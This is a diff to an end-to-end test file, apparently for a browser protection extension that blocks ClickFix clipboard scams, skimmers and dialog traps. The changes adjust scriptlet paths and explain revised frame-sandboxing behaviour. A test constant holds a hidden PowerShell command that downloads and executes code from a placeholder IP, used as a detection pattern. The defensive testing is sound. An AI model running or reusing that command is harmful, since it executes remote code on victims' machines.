@@ -43,7 +43,7 @@ const PASSWORD = "e2e-secret";
 const CLICKFIX_PAYLOAD = "powershell -w hidden -nop -c \"iex (irm http://198.51.100.7/a)\"";   // a STRONG pattern
 const FAKE_PIXEL_PATH = "/fbevents.js";             // Facebook Pixel loader name, served from a non-Facebook host
 // Event names the MAIN-world scriptlets dispatch — read from the shipped files, never retyped here (C39a).
-const SCRIPT_EVENT = Object.freeze({ CLICKFIX: ["security/sec-clickfix-clipboard.js", "CLICKFIX_BLOCKED_EVENT"],
+const SCRIPT_EVENT = Object.freeze({ CLICKFIX: ["security/scam-guard-page.js", "CLICKFIX_BLOCKED_EVENT"],
                                      SKIMMER:  ["security/sec-skimmer-warn.js", "SKIMMER_BLOCKED_EVENT"] });
 const LOG_MARK = "[3PMCF]";
 
@@ -156,7 +156,8 @@ try {
   const ctl = await ctx.newPage(); await ctl.goto(`chrome-extension://${extId}/ui/protections.html`);
   const send = (msg) => ctl.evaluate((m) => chrome.runtime.sendMessage(m), msg);
   // The ordinary site warning would interrupt these flows (test hosts score as unknown sites): off here.
-  await send({ type: M.MSG_SET_PROTECTION, key: P.PROTECTION_KEY.WARN_SUSPICIOUS_SITES, enabled: false });
+  // 5.1.3: the suspicious-site warning has no switch of its own any more (part of Scam protection, which these
+  // cases need); it stays on — opening a test page directly (no other site sent it) has not triggered it.
   await send({ type: M.MSG_SET_LEVEL, level: C.LEVEL.SMART });
   await sleep(APPLY_SETTLE_MS);
 
@@ -208,14 +209,11 @@ try {
     await sleep(APPLY_SETTLE_MS);
     return prompted;
   }
-  // At level 3 blockRedirectsDialogs sandboxes the page WITHOUT allow-modals, so Chrome itself
-  // suppresses every "Leave site?" prompt there — switched off for these two cases to test blockDialogSpam alone.
-  await send({ type: M.MSG_SET_PROTECTION, key: P.PROTECTION_KEY.BLOCK_REDIRECTS_DIALOGS, enabled: false });
-  await sleep(APPLY_SETTLE_MS);
+  // 5.1.3: blockRedirectsDialogs sandboxes FRAMES only — before, the top page was sandboxed too (without allow-modals),
+  // which made Chrome suppress every "Leave site?" prompt from level 3 outside safer regions. These cases run at
+  // level 3 (the test hosts are outside safer regions), where the frames block is on: the site's own prompt survives.
   ok("browser-locker: no \"Leave site?\" when nothing was typed", !(await leavePrompted(false)));
-  ok("browser-locker: \"Leave site?\" still shown after typing (unsaved changes)", await leavePrompted(true));
-  await send({ type: M.MSG_SET_PROTECTION, key: P.PROTECTION_KEY.BLOCK_REDIRECTS_DIALOGS, enabled: true });
-  await sleep(APPLY_SETTLE_MS);
+  ok("level 3 (frames sandboxed): \"Leave site?\" still shown after typing (unsaved changes)", await leavePrompted(true));
 
   // ── blockDialogSpam: back-button trap ──
   pg = await open(HOST_PREV, "/plain");
